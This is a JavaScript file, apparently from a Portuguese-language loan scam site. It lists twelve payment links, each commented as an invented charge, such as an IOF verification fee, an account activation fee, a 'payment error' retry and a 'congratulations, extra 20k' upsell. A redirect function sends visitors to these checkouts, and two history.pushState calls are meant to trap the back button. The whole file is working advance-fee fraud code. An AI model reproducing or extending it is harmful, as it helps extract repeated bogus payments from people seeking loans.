const baseLinks = {
    up1: "https://pay.transacaoseguraemprestimo.online/c/998b85f8-7660-40d4-8f05-13bd1d38e2ee", // IOF
    up2: "https://pay.transacaoseguraemprestimo.online/c/9fe92b6c-60f0-43fc-badd-1a41c7ab913c", // Taxa de verificação de IOF
    up3: "https://pay.transacaoseguraemprestimo.online/c/4312fc78-7447-4533-b653-9affad005d30", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.transacaoseguraemprestimo.online/c/1dd7cf85-7672-4a90-adf7-fc0515f4f923", // NFe
    up5: "https://pay.transacaoseguraemprestimo.online/c/e35c4c6d-c4a7-4228-81a0-90ea5b27e28c", // Ativar conta
    up6: "https://pay.transacaoseguraemprestimo.online/c/8dd0a491-4ffd-4918-9981-3832fc05c0b8", // Taxa de registro do contrato
    up7: "https://pay.transacaoseguraemprestimo.online/c/e5f7d985-cbb4-4086-8184-608c46ef626a", // Parabéns, 20k adicional
    up8: "https://pay.transacaoseguraemprestimo.online/c/c65f5f3d-8662-421e-a0d7-df3714f443cb", // Erro no pagamento - 14,06
    up9: "https://pay.transacaoseguraemprestimo.online/c/b96e4ba6-b55b-4266-8158-56ef796c165a", // APP - 11,99
    up10:"https://pay.transacaoseguraemprestimo.online/c/552e52ff-4af0-4974-9997-ef5eb6d1b8d9", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.transacaoseguraemprestimo.online/c/c10db266-27c0-464e-8f20-ede606b1c855", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.paguefinal.space/c/b0169469-cebc-43af-8ef4-076055e8b716" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

